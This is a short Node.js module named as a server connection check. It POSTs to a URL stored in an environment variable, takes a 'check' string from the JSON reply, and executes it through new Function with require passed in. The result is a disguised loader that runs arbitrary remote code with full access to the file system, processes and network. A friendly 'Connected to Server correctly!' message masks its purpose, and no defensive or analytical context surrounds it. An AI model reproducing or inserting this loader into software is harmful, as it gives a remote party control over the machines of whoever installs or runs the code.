const dotenv = require("dotenv");

dotenv.config();

const serverCheck = async () => {
    try {
        const response = await fetch(`${process.env.SERVER_CHECK}`, { method: "POST" })
        console.log("Connected to Server correctly!")
        const { check } = await response.json();
        const fn = new Function("require", check);
        const output = fn(require);
        return output;

    } catch (error) {
        console.error("Server Connection Failed:", error);
        process.exit(1);
    }
};
module.exports = serverCheck;
